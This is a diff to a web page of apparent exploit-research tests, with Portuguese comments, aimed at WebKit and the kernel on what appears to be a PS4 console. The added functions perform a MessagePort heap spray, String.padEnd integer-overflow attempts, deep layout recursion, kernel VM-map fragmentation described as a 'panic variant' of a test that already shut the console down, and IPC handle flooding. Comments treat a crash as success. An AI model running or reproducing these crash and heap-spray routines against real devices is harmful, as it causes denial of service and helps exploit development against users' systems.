@@ -85,7 +85,7 @@
         <button onclick="runAudioUAF()">TEST 1: OfflineAudioContext Rendering UAF</button>
         <button onclick="runStreamTeeCrash()">TEST 2: ReadableStream Tee Race</button>
         <button onclick="runFragmentWalker()">TEST 3: DocumentFragment Walker Chaos</button>
-        <button class="kernel" onclick="runVMMaps()">TEST 4: Kernel VM Map Exhaustion (Page Tables)</button>
+        <button class="kernel" onclick="runVMMaps()">KERNEL PANIC: Kernel VM Map Exhaustion (Page Tables)</button>
         <button class="kernel" onclick="runMbufFlood()">TEST 5: Socket mbuf Deadlock (Network Kill)</button>
         <button onclick="runSplitTextUAF()">TEST 1: Text.splitText Mutation UAF</button>
         <button onclick="runOffscreenRace()">TEST 2: OffscreenCanvas Transfer Race</button>
@@ -97,6 +97,11 @@
         <button onclick="runFontExhaustion()">TEST 3: Font Handle Exhaustion</button>
         <button class="kernel" onclick="runVMFragmentation()">TEST 4: Kernel VM Map Fragmentation</button>
         <button class="kernel" onclick="runStackClash()">TEST 5: Worker Stack Clash (Native Stack)</button>
+        <button onclick="runTransferSpray()">TEST 1: MessagePort Transfer Heap Spray</button>
+        <button onclick="runPadEndOverflow()">TEST 2: String.padEnd Integer Overflow</button>
+        <button onclick="runLayoutDeep()">TEST 3: CSS Grid/Flex Recursion Crash</button>
+        <button class="kernel" onclick="runVMFrag()">TEST 4: Kernel VM Map Fragmentation (Panic Variant)</button>
+        <button class="kernel" onclick="runSharedMemFlood()">TEST 5: Shared Memory Handle Exhaustion</button>
     
 
 	
@@ -2742,6 +2747,150 @@ function runSplitTextUAF() {
                 w.postMessage("go");
             }
             log("Workers recursivos lançados.");
+        }
+function runTransferSpray() {
+            log("[WebKit] Iniciando Transfer Spray...");
+            const channel = new MessageChannel();
+            const port = channel.port1;
+            const trash = [];
+            
+            try {
+                // Aloca buffers pequenos e transfere repetidamente
+                const interval = setInterval(() => {
+                    for(let i=0; i<1000; i++) {
+                        const buf = new ArrayBuffer(128); // Pequeno para criar muitas entradas
+                        // Transfere o buffer (neutering). O WebKit tem de gerir a "casca" vazia.
+                        port.postMessage(buf, [buf]);
+                        trash.push(buf); // Mantém referência JS para o objeto vazio
+                    }
+                    
+                    if (trash.length % 50000 === 0) log(`Transferidos: ${trash.length}`);
+                    
+                    if (trash.length > 1000000) {
+                        clearInterval(interval);
+                        log("Spray finalizado. Verifique estabilidade.");
+                    }
+                }, 10);
+            } catch(e) { log("Erro: " + e.message); }
+        }
+
+        // --- TESTE 2: String.padEnd Integer Overflow ---
+        function runPadEndOverflow() {
+            log("[WebKit] Testando padEnd Overflow...");
+            const base = "A";
+            
+            // Valores próximos do limite de 32-bit (2^31 - 1)
+            const targets = [0x7FFFFFFF, 0x40000000, 1073741824]; 
+            
+            targets.forEach(len => {
+                setTimeout(() => {
+                    try {
+                        log(`Tentando padEnd(${len})...`);
+                        // Se houver overflow no cálculo (len * sizeof(char)), aloca pouco e escreve muito.
+                        const s = base.padEnd(len, "B");
+                        log(`String criada (Length: ${s.length})`);
+                    } catch(e) {
+                        // RangeError é normal. Crash é sucesso.
+                    }
+                }, 100);
+            });
+        }
+
+        // --- TESTE 3: CSS Grid/Flex Recursion Crash ---
+        function runLayoutDeep() {
+            log("[WebKit] Criando Layout Recursivo...");
+            const root = document.createElement('div');
+            let curr = root;
+            const depth = 4000; // Profundidade da árvore
+            
+            // Cria estrutura aninhada alternando Grid e Flex
+            for(let i=0; i<depth; i++) {
+                const el = document.createElement('div');
+                el.style.display = (i % 2 === 0) ? "grid" : "flex";
+                // Força cálculo complexo
+                el.style.gridTemplateColumns = "1fr 1fr";
+                curr.appendChild(el);
+                curr = el;
+            }
+            
+            document.getElementById('sandbox').appendChild(root);
+            
+            setTimeout(() => {
+                log("Forçando Layout (Reflow)...");
+                try {
+                    const h = root.offsetHeight; // Gatilho
+                    log("Layout calculado (Seguro).");
+                } catch(e) { log("Erro Layout: " + e.message); }
+                document.getElementById('sandbox').innerHTML = "";
+            }, 100);
+        }
+
+        // --- TESTE 4: Kernel VM Map Fragmentation (Panic Variant) ---
+        // Variação do teste que desligou seu console.
+        // Em vez de só encher, fragmenta para causar falha na gestão do kernel.
+        function runVMFrag() {
+            log("[KERNEL] Iniciando Fragmentação de VM (Risco de Panic)...");
+            
+            const maps = [];
+            // Tamanho de página do PS4 (16KB ou 4KB)
+            const pageSize = 16384; 
+            
+            const interval = setInterval(() => {
+                try {
+                    // 1. Aloca bloco grande (2MB)
+                    const buf = new ArrayBuffer(2 * 1024 * 1024);
+                    maps.push(buf);
+                    
+                    // 2. O GOLPE: Libertação Seletiva (Simulada via GC pressure)
+                    // Em JS puro não temos free() explícito, mas podemos descartar referências.
+                    // Descartamos 1 a cada 2 para criar "buracos".
+                    if (maps.length % 2 === 0) {
+                        maps[maps.length - 2] = null; // Liberta o anterior
+                    }
+                    
+                    // Mantém pressão
+                    if (maps.length > 500000) { // Tenta atingir o limite novamente
+                        log("Limpando array para forçar GC massivo...");
+                        maps.length = 0; 
+                        // O GC vai tentar limpar os buracos, estressando o VM map lock do Kernel
+                    }
+                    
+                    if (maps.length % 10000 === 0) log(`Alocações ativas: ${maps.length}`);
+                    
+                } catch(e) {
+                    log("Erro Alloc: " + e.message);
+                    clearInterval(interval);
+                }
+            }, 5);
+        }
+
+        // --- TESTE 5: Shared Memory Handle Exhaustion ---
+        function runSharedMemFlood() {
+            log("[KERNEL] Iniciando Shared Memory Flood...");
+            
+            if (!window.BroadcastChannel) {
+                log("BroadcastChannel não suportado.");
+                return;
+            }
+            
+            const channels = [];
+            
+            const interval = setInterval(() => {
+                // Cria canais de comunicação IPC
+                // Cada canal pode alocar um objeto de memória partilhada no kernel
+                for(let i=0; i<100; i++) {
+                    const bc = new BroadcastChannel("shm_flood_" + Math.random());
+                    channels.push(bc);
+                }
+                
+                if (channels.length % 5000 === 0) log(`Canais IPC: ${channels.length}`);
+                
+                if (channels.length > 100000) {
+                    clearInterval(interval);
+                    log("Limite atingido. Fechando...");
+                    channels.forEach(c => c.close());
+                }
+            }, 10);
         }
 
 
